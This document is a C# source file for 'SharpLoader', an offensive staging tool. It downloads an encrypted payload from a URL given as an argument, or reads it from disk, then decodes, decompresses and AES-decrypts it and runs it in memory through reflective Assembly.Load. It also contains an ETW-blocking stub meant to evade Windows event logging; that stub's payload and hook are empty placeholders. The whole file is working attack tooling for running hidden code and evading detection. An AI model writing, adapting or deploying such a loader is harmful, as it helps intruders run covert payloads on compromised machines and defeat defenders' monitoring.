using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace SharpLoader
{
    public class ETWBlocker
    {
        public static void InvokeBlockETW()
        {
            string base64Binary = "";
            byte[] binary = Convert.FromBase64String(base64Binary);
            Assembly.Load(binary);
            hooketw.Main("");
        }
    }

    public class Loader
    {
        public static string GetStage2(string url)
        {
            try
            {
                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
                HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
                using (Stream data = response.GetResponseStream())
                using (StreamReader sr = new StreamReader(data))
                {
                    return sr.ReadToEnd();
                }
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[!] Whoops, there was an issue with the url...");
                Console.ResetColor();
                return null;
            }
        }

        public static string GetStage2Disk(string filepath)
        {
            return File.ReadAllText(filepath);
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);
                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                    }
                }
            }
            return decryptedBytes;
        }

        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[32768];
                int read;
                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }
                return resultStream.ToArray();
            }
        }

        public static byte[] Base64_Decode(string encodedData)
        {
            return Convert.FromBase64String(encodedData);
        }

        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace && password.Length > 0)
                {
                    password = password.Substring(0, password.Length - 1);
                    Console.Write("\b \b"); // 删除一个字符
                }
                info = Console.ReadKey(true);
            }
            Console.WriteLine();
            return password;
        }

        public static void LoadAssembly(byte[] bin, object[] commands)
        {
            Assembly assembly = Assembly.Load(bin);
            MethodInfo entryPoint = assembly.EntryPoint;

            if (entryPoint != null)
            {
                try
                {
                    ParameterInfo[] parameters = entryPoint.GetParameters();
                    Console.WriteLine("EntryPoint parameters count: " + parameters.Length);

                    // 检查参数类型
                    if (parameters.Length == 1 && parameters[0].ParameterType == typeof(string[]))
                    {
                        // 将 commands 转换为 string[]
                        entryPoint.Invoke(null, new object[] { Array.ConvertAll(commands, cmd => cmd.ToString()) });
                    }
                    else
                    {
                        Console.WriteLine("Parameter mismatch.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error invoking entry point: " + ex.Message);
                }
            }
        }




        public static void Main(string[] args)
        {
            PrintBanner();
            if (args.Length < 2)
            {
                Console.WriteLine("Parameters missing");
                return;
            }

            string location = args[0];
            string stage2;

            if (location.StartsWith("http"))
            {
                Console.Write("[*] One moment while getting our file from URL.... ");
                stage2 = GetStage2(location);
            }
            else
            {
                Console.WriteLine("NO URL, loading from disk.");
                Console.Write("[*] One moment while getting our file from disk.... ");
                stage2 = GetStage2Disk(location);
            }

            Console.WriteLine("-> Done");
            Console.Write("[*] Decrypting file in memory... > ");
            string password = args[1];
            Console.WriteLine(password);
            Console.WriteLine();

            byte[] decoded = Base64_Decode(stage2);
            byte[] decompressed = Decompress(decoded);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);

            int saltSize = 4;
            byte[] originalBytes = new byte[bytesDecrypted.Length - saltSize];
            Array.Copy(bytesDecrypted, saltSize, originalBytes, 0, originalBytes.Length);

            object[] cmd = args.Length > 2 ? new object[args.Length - 2] : new object[] { };
            if (args.Length > 2)
            {
                Array.Copy(args, 2, cmd, 0, cmd.Length);
            }
            Console.WriteLine("Command parameters: " + string.Join(", ", cmd));
            LoadAssembly(originalBytes, cmd);
        }

        private static void PrintBanner()
        {
            Console.WriteLine(@"                                                           ");
            Console.WriteLine(@"    ______                 __                __            ");
            Console.WriteLine(@"   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____     ");
            Console.WriteLine(@"  _\ \/ _ \/ _ / __/ _ \/ /__/ _ \/ _ / _  / -_) __/     ");
            Console.WriteLine(@" /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/        ");
            Console.WriteLine(@"                  /_/                                      ");
            Console.WriteLine(@"             Loads an AES Encrypted CSharp File            ");
            Console.WriteLine(@"                        from disk or URL                   ");
            Console.WriteLine();
        }
    }

    public static class hooketw
    {
        public static void Main(string args)
        {
            // ETW Hooking logic goes here.
            Console.WriteLine("ETW Hooking logic goes here.");
        }
    }
}